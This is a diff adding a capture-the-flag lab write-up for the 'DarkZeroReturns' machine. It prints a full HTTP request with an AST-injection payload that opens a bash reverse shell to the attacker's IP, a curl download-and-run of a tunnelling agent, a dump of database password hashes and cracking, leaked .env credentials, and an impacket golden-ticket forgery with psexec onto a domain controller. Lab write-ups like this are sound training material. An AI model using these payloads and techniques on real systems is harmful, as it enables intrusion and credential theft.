@@ -1,0 +1,135 @@
+# Profile
+- Lab: DarkZeroReturns
+- ip: 10.129.59.158
+- Category: Windows
+
+# Enumeration
+sudo nmap -sC -sV -oN nmap_drz 10.129.59.158
+|- 22 ssh ; 80 http
+
+Exploring the http, we get to http://dzcampaigns.htb
+
+## As darkzero@SRV01
+We get into the server using the AST injection and got a revshell as darkzero on SRV01. Let's look around.
+We found this .env and look at /etc/passwd we see mysql server on this, even looking the server.js we know for sure there is a db and it seems it is mysql db.
+```.env
+PORT=8081
+DB_HOST=localhost
+DB_USER=darkzero
+DB_PASSWORD=C4ntFindMyDMpass!
+DB_NAME=darkzero_campaigns
+SESSION_SECRET=DarkSession312#
+```
+## As josh@SRV01
+We are in, and we found a lot of ports open, we have to do a well all port forwarding to scan the network, for it we will use ligolo to nmap the net and be able to run a lot of commands ( to have a sort of session ).
+After setting this up, we can run command on the route we add on the interface and have a good proxy for our commands:
+`sudo /opt/tools/ligolo/proxy -selfcert -laddr 0.0.0.0:11601 # on our parrot`
+``` #on our target
+curl http://10.10.16.236/agent -o agent
+chmod +x agent
+nohup ./agent -connect 10.10.16.236:11601 -ignore-cert > /dev/null 2>&1 &
+```
+Here we receive a connection on our ligolo, and so a session. Then on our ligolo session
+``` #on our ligolo session
+interface_create --name "ligolo"
+interface_add_route --name ligolo --route 240.0.0.1/32
+interface_add_route --name ligolo --route 172.16.20.0/24
+start --tun ligolo
+```
+Now we can run command to access those routes we add. like:
+`sudo nmap --open 172.16.20.0/24 -oN scope_drz`
+```
+nxc smb 172.16.20.0/24 --generate-hosts-file hosts_drz
+# 172.16.20.2     DC02.darkzero.ext darkzero.ext DC02
+# 172.16.20.1     DC01.darkzero.htb darkzero.htb DC01
+
+cat hosts_drz | sudo tee -a /etc/hosts
+
+nxc smb 172.16.20.0/24 -u josh -p 'Rangers1'
+# SMB         172.16.20.2     445    DC02             [+] darkzero.ext\josh:Rangers1
+```
+
+
+# Exploitation
+We look the http://dzcampaigns.htb/ site, look around to see for vuln or cve. we find smth when we want to create a character, the default campaign message, might help us to breach a rce.
+
+Might use the cve 2026-33937 to craft a AST json... to execute rce
+
+```Burpsuite
+POST /character HTTP/1.1
+Host: dzcampaigns.htb
+Content-Length: 681
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://dzcampaigns.htb
+Content-Type: application/json
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://dzcampaigns.htb/character/new
+Accept-Encoding: gzip, deflate, br
+Cookie: dz.sid=s%3AYE7tKlXICnA3aZpaMLW2YKM7b1XNJrnU.JSReCg2Mh9DnmFiao4XFcEExcj5jjvN%2BwNQ03BzT%2BGU
+Connection: keep-alive
+
+{"_csrf":"c2cbb2c7d55c015627608e435a3ca8e101c5993fa010377e0bb88a4455391725","name":"jones7","race":"king race","class":"king class","backstory":"yo","campaign_id":"1","campaign_message":{
+  "type": "Program",
+  "body": [
+    {
+      "type": "MustacheStatement",
+      "path": {
+        "type": "PathExpression",
+        "parts": ["log"]
+      },
+      "params": [
+        {
+          "type": "BooleanLiteral",
+          "value": "{}, {hash: {}})) + process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.80/7777 0>&1\"') + Object(String(''"
+        }
+      ],
+      "escaped": true,
+      "loc": {
+        "start": {},
+        "end": {}
+      } 
+    }
+  ]
+}
+}
+```
+## As darkzero@SRV01
+we will look into the db to get sensitive informations.
+```darkzero_campaigns
+select * from users;
++----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
+| id | email                 | username | password_hash                                                | role   | created_at          |
++----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
+|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
+|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
+|  4 | nanok@kmail.com       | nano     | $2b$10$XPfvJzsCvcCBoFq4ou49m.n40pi6bulOhTtFqxFIqfADfukxR96WS | player | 2026-07-28 08:27:19 |
++----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
+3 rows in set (0.00 sec)
+```
+Let's look for cracking josh and admin password.
+Using `hashcat -m 3200 hash.txt -w /usr/share/wordlists/rockyou.txt` which hash.txt containing the password_hash of josh ( and we may try admin too ).
+And we got the password of josh ( Rangers1 ) but not for admin, let's try to connect to it through ssh and we ssh in.
+
+
+## After getting Administrator.ccache through 
+```
+impacket-ticketer -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
+                  -domain darkzero.ext \
+                  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-519 \
+                  -user-id 500 \
+                  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
+                  Administrator
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+faketime '+7 hours' proxychains4 -q nxc smb 172.16.20.2 -u Administrator -d darkzero.ext -k --use-kcache
+# [+] darkzero.ext\Administrator from ccache (Pwn3d!)
+```
+### we connect to this machine using the Administrator.ccache
+`export KRB5CCNAME=Administrator.ccache; faketime '+7hours' impacket-psexec darkzero.ext/administrator@DC01.darkzero.ext -k -no-pass`
+
+# Links
+https://github.com/dinhvaren/cve-2026-33937/blob/main/README.md
+
+https://github.com/greenboys244/htb-writeup/blob/main/darkzeroreturns.md
